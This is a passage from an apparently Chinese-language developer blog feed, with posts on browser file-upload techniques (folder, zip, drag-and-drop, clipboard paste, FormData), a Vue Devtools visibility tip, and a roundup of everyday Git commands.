<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;uploadFile2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span> <span class="attr">multiple</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">upload</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取上传的input元素</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> uploadFileEle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#uploadFile2&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取文件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> files = uploadFileEle.<span class="property">files</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 需要在表单里面循环添加我们的文件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Object</span>.<span class="title function_">values</span>(files).<span class="title function_">forEach</span>(<span class="function">(<span class="params">file, i</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span> + i, file)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 进行请求</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// axios.post(url, formData)</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="文件夹上传"><a href="#文件夹上传" class="headerlink" title="文件夹上传"></a>文件夹上传</h3><p>在<code>input</code>元素里面添加<code>webkitdirectory</code>属性，表示是文件夹上传。</p>
<p>该属性的兼容性如下，需要注意<code>IE</code>是完全不支持的。<a href="https://caniuse.com/?search=webkitdirectory">详见</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;uploadFile3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span> <span class="attr">webkitdirectory</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">upload</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取上传的input元素</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> uploadFileEle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#uploadFile3&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取文件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> files = uploadFileEle.<span class="property">files</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 需要在表单里面循环添加我们的文件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Object</span>.<span class="title function_">values</span>(files).<span class="title function_">forEach</span>(<span class="function">(<span class="params">file, i</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span> + i, file)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 进行请求</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// axios.post(url, formData)</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以文件夹方式上传的话，在选择文件夹后会有个小提示。并且我们可以在<code>File</code>对象里面通过<code>webkitRelativePath</code>属性看到该文件的相对路径。</p>
<h3 id="jszip-压缩上传"><a href="#jszip-压缩上传" class="headerlink" title="jszip 压缩上传"></a>jszip 压缩上传</h3><p>压缩上传就是将文件压缩成压缩包，然后再上传到服务端。压缩还是使用我们前面介绍的<a href="https://github.com/Stuk/jszip">jszip</a>库。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;uploadFile4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span> <span class="attr">webkitdirectory</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">generateZipFile</span>(<span class="params">zipName, files, options = &#123; type: <span class="string">&#x27;blob&#x27;</span>, compression: <span class="string">&#x27;DEFLATE&#x27;</span> &#125;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 创建 JSZip 对象</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> zip = <span class="keyword">new</span> <span class="title class_">JSZip</span>()</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">Object</span>.<span class="title function_">values</span>(files).<span class="title function_">forEach</span>(<span class="function">(<span class="params">file, i</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 循环遍历 把文件添加到前面创建的 JSZip 对象中</span></span></span><br><span class="line"><span class="language-javascript">        zip.<span class="title function_">file</span>(<span class="string">&#x27;file&#x27;</span> + i, file)</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 生成 JSZip 文件</span></span></span><br><span class="line"><span class="language-javascript">      zip.<span class="title function_">generateAsync</span>(options).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">blob</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        zipName = zipName || <span class="title class_">Date</span>.<span class="title function_">now</span>() + <span class="string">&#x27;.zip&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> zipFile = <span class="keyword">new</span> <span class="title class_">File</span>([blob], zipName, &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">type</span>: <span class="string">&#x27;application/zip&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">resolve</span>(zipFile)</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取上传的input元素</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> uploadFileEle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#uploadFile4&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取文件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> files = uploadFileEle.<span class="property">files</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取相对路径</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> webkitRelativePath = fileList[<span class="number">0</span>].<span class="property">webkitRelativePath</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取文件夹的名字，用做zip包的名字</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> zipFileName = webkitRelativePath.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.zip&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> zipFile = <span class="keyword">await</span> <span class="title function_">generateZipFile</span>(zipFileName, fileList)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span></span><br><span class="line"><span class="language-javascript">    formData.<span class="title function_">append</span>(<span class="string">&#x27;zipfile&#x27;</span>, zipFile)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 进行请求</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// axios.post(url, formData)</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="拖拽上传"><a href="#拖拽上传" class="headerlink" title="拖拽上传"></a>拖拽上传</h3><p>要实现拖拽上传的功能，我们需要先了解与拖拽相关的事件。比如 drag、dragend、dragenter、dragover 或 drop 事件等。</p>
<p>dragenter：当拖拽元素或选中的文本到一个可释放目标时触发；<br>dragover：当元素或选中的文本被拖到一个可释放目标上时触发（每 100 毫秒触发一次）；<br>dragleave：当拖拽元素或选中的文本离开一个可释放目标时触发；<br>drop：当元素或选中的文本在可释放目标上被释放时触发。<br>关于拖拽事件大家可以查看 mdn 官方文档笔者在这里就不细说了。</p>
<p>拖拽上传的核心是通过 DataTransfer 对象的 files 属性来获取文件列表，然后在利用 FormData 进行上传。<br><strong>核心代码</strong>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dropAreaEle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;drop&#x27;</span>, handleDrop, <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleDrop</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="comment">// 在dataTransfer对象上获取文件列表</span></span><br><span class="line">  <span class="keyword">const</span> files = e.<span class="property">dataTransfer</span>.<span class="property">files</span></span><br><span class="line">  <span class="keyword">let</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">values</span>(files).<span class="title function_">forEach</span>(<span class="function">(<span class="params">file, i</span>) =&gt;</span> &#123;</span><br><span class="line">    formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span> + i, file)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 进行请求</span></span><br><span class="line">  <span class="comment">// axios.post(url, formData)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="复制粘贴上传"><a href="#复制粘贴上传" class="headerlink" title="复制粘贴上传"></a>复制粘贴上传</h3><p>对于复制粘贴我们首先需要了解 Clipboard 对象。</p>
<p>我们可以通过 navigator.clipboard 来获取 Clipboard 对象，然后通过 navigator.clipboard.read()获取内容。但是对于不兼容的我们需要通过 e.clipboardData.items 来访问剪贴板中的内容。</p>
<p>下面的例子是获取剪切板里面的图片进行上传。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">onst <span class="variable constant_">IMAGE_MIME_REGEX</span> = <span class="regexp">/^image\/(jpe?g|gif|png)$/i</span>;</span><br><span class="line"><span class="keyword">const</span> uploadAreaEle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#uploadArea&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听粘贴事件</span></span><br><span class="line">uploadAreaEle.<span class="title function_">addEventListener</span>(<span class="string">&quot;paste&quot;</span>, <span class="keyword">async</span> (e) =&gt; &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">const</span> files = [];</span><br><span class="line">  <span class="keyword">if</span> (navigator.<span class="property">clipboard</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> clipboardItems = <span class="keyword">await</span> navigator.<span class="property">clipboard</span>.<span class="title function_">read</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> clipboardItem <span class="keyword">of</span> clipboardItems) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> type <span class="keyword">of</span> clipboardItem.<span class="property">types</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">IMAGE_MIME_REGEX</span>.<span class="title function_">test</span>(type)) &#123;</span><br><span class="line">          <span class="keyword">const</span> blob = <span class="keyword">await</span> clipboardItem.<span class="title function_">getType</span>(type);</span><br><span class="line">          files.<span class="title function_">push</span>(blob);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> items = e.<span class="property">clipboardData</span>.<span class="property">items</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; items.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable constant_">IMAGE_MIME_REGEX</span>.<span class="title function_">test</span>(items[i].<span class="property">type</span>)) &#123;</span><br><span class="line">        <span class="keyword">let</span> file = items[i].<span class="title function_">getAsFile</span>();</span><br><span class="line">        files.<span class="title function_">push</span>(file);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 有了files我们就可以利用FormData进行上传啦</span></span><br><span class="line">  <span class="keyword">let</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">  files.<span class="title function_">forEach</span>(<span class="function">(<span class="params">file, i</span>) =&gt;</span> &#123;</span><br><span class="line">    formData.<span class="title function_">append</span>(<span class="string">&quot;file&quot;</span> + i, file);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 进行请求</span></span><br><span class="line">  <span class="comment">// axios.post(url, formData)</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="关于-FormData"><a href="#关于-FormData" class="headerlink" title="关于 FormData"></a>关于 FormData</h2><p>前面的上传都涉及到了<code>FormData</code>，关于<code>FormData</code>很多小伙伴可能不太理解，笔者在这里详细讲解下关于<code>FormData</code>的相关<code>api</code>。</p>
<p><code>FormData</code>我们可以想像成<code>js</code>版的表单。功能和我们的<code>html</code>表单是类似的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过FormData构造函数创建一个空对象</span></span><br><span class="line"><span class="keyword">const</span> formdata = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span><br><span class="line"><span class="comment">// 可以通过append()方法来追加数据</span></span><br><span class="line">formdata.<span class="title function_">append</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;randy&#x27;</span>)</span><br><span class="line"><span class="comment">// 通过get方法对值进行读取</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(formdata.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)) <span class="comment">//randy</span></span><br><span class="line"><span class="comment">// 通过set方法对值进行设置</span></span><br><span class="line">formdata.<span class="title function_">set</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;demi&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(formdata.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)) <span class="comment">//demi</span></span><br><span class="line"><span class="comment">// 获取key为age的所有值，返回值为数组类型</span></span><br><span class="line">formdata.<span class="title function_">getAll</span>(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line"><span class="comment">// 判断是否包含key为name的数据</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(formdata.<span class="title function_">has</span>(<span class="string">&#x27;name&#x27;</span>)) <span class="comment">//true</span></span><br><span class="line"><span class="comment">// 删除key为name的值</span></span><br><span class="line">formdata.<span class="title function_">delete</span>(<span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>除了创建一个全新的<code>formData</code>，我们还可以基于一个现有表单进行初始化。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myForm&quot;</span>&gt;</span>名称：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;randy&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据id获得页面当中的form表单元素</span></span><br><span class="line"><span class="keyword">const</span> myForm = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#myForm&#x27;</span>)</span><br><span class="line"><span class="comment">// 将获得的表单元素作为参数，对formData进行初始化</span></span><br><span class="line"><span class="keyword">const</span> formdata = <span class="keyword">new</span> <span class="title class_">FormData</span>(myForm)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(formdata.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)) <span class="comment">// randy</span></span><br></pre></td></tr></table></figure>

<p>对于<code>formData</code> 类似<code>Object</code>，支持<code>keys</code>、<code>values</code>、<code>entries</code>三种遍历方式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">formData.<span class="title function_">keys</span>()</span><br><span class="line">formData.<span class="title function_">values</span>()</span><br><span class="line">formData.<span class="title function_">entries</span>()</span><br></pre></td></tr></table></figure>

<p>了解更多，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/FormData">详见</a></p>
<h2 id="阿里-oss-上传和下载"><a href="#阿里-oss-上传和下载" class="headerlink" title="阿里 oss 上传和下载"></a>阿里 oss 上传和下载</h2><p>除了上面介绍的在自己服务器上传下载，我们还可能会碰到第三方服务器的上传和下载，例如<code>oss</code>。</p>
<p><a href="https://help.aliyun.com/document_detail/32067.html">oss node 文档</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://juejin.cn/post/7046313942938812424">前端二进制 ArrayBuffer、TypedArray、DataView、Blob、File、Base64、FileReader 一次性搞清楚</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>文件</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue开发工具指南</title>
    <url>/2021/11/26/20211126-Vue%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p><img src="https://cdn.huatree.top/image-20220508124243345.png" alt="image-20220508124243345"></p>
<span id="more"></span>

<h2 id="谷歌-F12-状态栏未出现-Vue-Devtools"><a href="#谷歌-F12-状态栏未出现-Vue-Devtools" class="headerlink" title="谷歌 F12 状态栏未出现 Vue Devtools"></a>谷歌 F12 状态栏未出现 Vue Devtools</h2><p>在 Vue Devtools 插件加入的情况下，如果是文件地址直接打开的 <code>.html</code> 文件，需要检查该插件是否<code>允许访问文件地址</code>，如下图所示：</p>
<p><img src="https://cdn.huatree.top/image-20220508115506971.png" alt="image-20220508115506971"></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://devtools.vuejs.org/">Vue Devtools</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Git常见问题与总结</title>
    <url>/2021/12/20/20211220-Git%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>在实际开发中遇到的一些 Git 常现的问题与总结。</p>
<p><img src="https://git-scm.com/images/branching-illustration@2x.png" alt="top"></p>
<span id="more"></span>

<div class="note warning"><p>文章中的<code>origin</code>是<code>git remote add origin &lt;url&gt;</code>添加远程仓库的别名。</p>
</div>

<h2 id="1-操作仓库前的必要检查与配置"><a href="#1-操作仓库前的必要检查与配置" class="headerlink" title="1 操作仓库前的必要检查与配置"></a>1 操作仓库前的必要检查与配置</h2><h3 id="文件名大小写"><a href="#文件名大小写" class="headerlink" title="文件名大小写"></a>文件名大小写</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看是否忽略文件名大小写</span></span><br><span class="line">$ git config --global -l</span><br><span class="line">$ git config &lt;--<span class="built_in">local</span>&gt; -l</span><br><span class="line"><span class="comment"># 配置成不能忽略文件名大小写(windows系统下，安装git时会默认配置core.ignorecase=true，因为windows的文件名本身不区分大小写)</span></span><br><span class="line">$ git config --global core.ignorecase <span class="literal">false</span></span><br><span class="line">$ git config &lt;--<span class="built_in">local</span>&gt; core.ignorecase <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="文件名过长导致的错误"><a href="#文件名过长导致的错误" class="headerlink" title="文件名过长导致的错误"></a>文件名过长导致的错误</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先查看默认的配置</span></span><br><span class="line">$ git config --global -l</span><br><span class="line">$ git config &lt;--<span class="built_in">local</span>&gt; -l</span><br><span class="line"><span class="comment"># 如果没查到core.longpaths配置项或core.longpaths=false时，需要如下配置</span></span><br><span class="line">$ git config --global core.longpaths <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="2-怎么比较优雅的获取远程仓库"><a href="#2-怎么比较优雅的获取远程仓库" class="headerlink" title="2 怎么比较优雅的获取远程仓库"></a>2 怎么比较优雅的获取远程仓库</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># clone 远程仓库的默认分支到本地</span></span><br><span class="line">$ git <span class="built_in">clone</span> &lt;ssh:git url&gt;</span><br><span class="line">$ git checkout -b &lt;branch a&gt;</span><br><span class="line">$ git pull origin &lt;branch a&gt;</span><br><span class="line"><span class="comment"># 上2行命令结果与下面一样</span></span><br><span class="line">$ git fetch origin &lt;branch a&gt;:&lt;branch a&gt;</span><br><span class="line">$ git checkout &lt;branch a&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3-分支重命名"><a href="#3-分支重命名" class="headerlink" title="3 分支重命名"></a>3 分支重命名</h2><p>VSCode 中打开控制台，输入 <code>git branch --help</code>，弹出 <code>branch</code>相关网页，根据提示操作。</p>
<blockquote>
<p>tops</p>
<p>安装 git 时，本地安装目录中会存在相关 git-doc 资料，路径如<code>E:\Program Files\Git\mingw64\share\doc\git-doc</code><br>win 系列的系统，cmd 命令中输入 <code>git branch --help</code>也有效。</p>
</blockquote>
<p>具体操作如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地分支重命名</span></span><br><span class="line">$ git branch -m &lt;old branch name&gt; &lt;new branch name&gt;</span><br><span class="line"><span class="comment"># 删除远程需要重命名的分支</span></span><br><span class="line">$ git push -d origin &lt;old branch name&gt;</span><br><span class="line"><span class="comment"># 推送新命名分分支</span></span><br><span class="line">$ git push origin &lt;new branch name&gt;</span><br><span class="line"><span class="comment"># 修改本地分支与远程分支关联</span></span><br><span class="line">$ git branch --set-upstream-to origin/&lt;new branch name&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>! 注意<br>当前本地分支与远程分支对应保持一致</p>
</blockquote>
<h2 id="4-分支删除"><a href="#4-分支删除" class="headerlink" title="4 分支删除"></a>4 分支删除</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除本地分支</span></span><br><span class="line">$ git branch -d &lt;branch name&gt;</span><br><span class="line"><span class="comment"># 删除远程分支</span></span><br><span class="line">$ git push -d origin &lt;branch name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5-打标签"><a href="#5-打标签" class="headerlink" title="5 打标签"></a>5 打标签</h2><h3 id="记录项目的发版，常用附注标签"><a href="#记录项目的发版，常用附注标签" class="headerlink" title="记录项目的发版，常用附注标签"></a>记录项目的发版，常用附注标签</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打附注标签</span></span><br><span class="line">$ git tag -a &lt;tag name&gt; -m &lt;<span class="string">&quot;msg&quot;</span>&gt;</span><br><span class="line"><span class="comment"># 打附注标签(指定commit id)</span></span><br><span class="line">$ git tag -a &lt;tag name&gt; -m &lt;<span class="string">&quot;msg&quot;</span>&gt; &lt;commit <span class="built_in">id</span>&gt;</span><br><span class="line"><span class="comment"># 推送本地仓库标签到远程仓库</span></span><br><span class="line">$ git push origin &lt;tag name&gt;</span><br><span class="line"><span class="comment"># 列出所有标签</span></span><br><span class="line">$ git tag -l</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ git tag</span><br><span class="line"><span class="comment"># 列出标签(带匹配模式)</span></span><br><span class="line">$ git tag -l <span class="string">&#x27;v-*&#x27;</span></span><br><span class="line"><span class="comment"># 删除本地仓库标签</span></span><br><span class="line">$ git tag -d &lt;tag name&gt;</span><br><span class="line"><span class="comment"># 再删除远程仓库标签</span></span><br><span class="line">$ git push -d origin &lt;tag name&gt;</span><br></pre></td></tr></table></figure>

<h3 id="tag-与-release"><a href="#tag-与-release" class="headerlink" title="tag 与 release"></a>tag 与 release</h3><p>tag 是 git 提供的功能，release 是如 github、gitee、gitlab 等代码托管平台基于 git tag 的锦上添花，对 git 的 tag 功能的增强。</p>
<h2 id="6-git-flow"><a href="#6-git-flow" class="headerlink" title="6 git flow"></a>6 git flow</h2><p><a href="https://nvie.com/posts/a-successful-git-branching-model/">一个成功的 Git 分支模型</a></p>
<p><a href="https://docs.gitlab.com/ee/topics/gitlab_flow.html">GitLab 流程</a></p>
<h2 id="7-回退代码到指定版本"><a href="#7-回退代码到指定版本" class="headerlink" title="7 回退代码到指定版本"></a>7 回退代码到指定版本</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确定需要回退的分支，如 master</span></span><br><span class="line">$ git branch</span><br><span class="line"><span class="comment"># 查看所有的历史版本，获取你 git commit 的某个历史版本的 id</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line"><span class="comment"># 回退本地仓库(恢复上一次提交，保留暂存区的改动)</span></span><br><span class="line">$ git reset --soft &lt;commit <span class="built_in">id</span>&gt;</span><br><span class="line"><span class="comment"># 如果想丢掉工作区的改动，则用 --hard</span></span><br><span class="line">$ git reset --hard &lt;commit <span class="built_in">id</span>&gt;</span><br><span class="line"><span class="comment"># 推送到远程仓库某个分支</span></span><br><span class="line">$ git push -f origin master</span><br></pre></td></tr></table></figure>

<h2 id="8-常用的查看提交历史命令"><a href="#8-常用的查看提交历史命令" class="headerlink" title="8 常用的查看提交历史命令"></a>8 常用的查看提交历史命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示分支图</span></span><br><span class="line">$ git <span class="built_in">log</span> --graph</span><br><span class="line">$ git <span class="built_in">log</span> --pretty=oneline</span><br><span class="line">$ git <span class="built_in">log</span> --pretty=format:<span class="string">&quot;%h - %an, %ar : %s&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-撤销指定的提交内容"><a href="#9-撤销指定的提交内容" class="headerlink" title="9 撤销指定的提交内容"></a>9 撤销指定的提交内容</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git show &lt;commit <span class="built_in">id</span>&gt;</span><br><span class="line">git revert -m &lt;number&gt; &lt;commit <span class="built_in">id</span>&gt;</span><br><span class="line"><span class="comment"># 如果需要回复之前撤销过的指定的提交内容，再次revert</span></span><br><span class="line">git revert &lt;commit <span class="built_in">id</span>&gt;</span><br></pre></td></tr></table></figure>

<p><code>-m</code> 选项接收的参数是一个数字，数字取值为 1 和 2，也就是 Merge 行里面列出来的第一个还是第二个，其含义用来保留某个分支。</p>
<p><code>git revert</code>是用一次新的commit来回滚之前的commit。</p>
<h2 id="10-代码临时保存"><a href="#10-代码临时保存" class="headerlink" title="10 代码临时保存"></a>10 代码临时保存</h2><p>如果你正在写开发新分支的需求，别的分支线上突然有 bug 需要修复，你或许只能被迫先提交写的代码，这种情况可以用以下命令操作：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 工作区的代码临时保存</span></span><br><span class="line">$ git stash</span><br><span class="line">$ git status</span><br><span class="line"><span class="comment"># 恢复临时保存的代码到工作区（当你在切回自己的分支时，用指令恢复之前的代码就OK）</span></span><br><span class="line">$ git stash apply</span><br></pre></td></tr></table></figure>

<p>如果有未跟踪的文件，需要先<code>git add &lt;file&gt;</code>，再<code>git stash</code>。因为<code>git stash</code>只临时保存已跟踪的文件。</p>
